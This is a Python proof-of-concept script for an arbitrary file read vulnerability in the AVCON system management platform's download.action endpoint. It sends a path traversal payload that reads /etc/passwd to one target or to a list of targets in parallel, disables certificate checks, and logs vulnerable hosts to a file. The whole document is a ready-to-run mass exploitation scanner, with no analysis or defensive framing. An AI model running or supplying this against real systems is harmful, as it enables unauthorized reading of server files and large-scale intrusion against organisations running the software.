#AVCON-系统管理平台 download.action 任意文件读取漏洞
#title="AVCON-系统管理平台"
import requests
import sys
import argparse
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def main():
    parse = argparse.ArgumentParser(description="sc环境")
    parse.add_argument('-u', '--url', dest='url', type=str, help='please enter the url:')
    parse.add_argument('-f', '--file', dest='file', type=str, help='please enter the filename:')
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(10)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        pass

def poc(target):
    payload = '/download.action?filename=../../../../../../etc/passwd'
    # payload2='/magicflu/test3.jsp'

    headers = {

        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
        'Connection': 'close'
    }
#     proxies = {
#     'http': 'http://127.0.0.1:8080',
#     'https': 'http://127.0.0.1:8080'
# }
    try:
        res1 = requests.get(url=target + payload, headers=headers, timeout=10, verify=False)
        # res2 =requests.get(url=target +payload2,header=headers,timeout=10, verify=False)
        if 'root' in res1.text:
            print(target + 'wenjianupload')
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
        else:
            print("there is no vulnurability")
    except requests.exceptions.RequestException as e:
        print(f"Error with {target}: {e}")

if __name__ == '__main__':
    main()
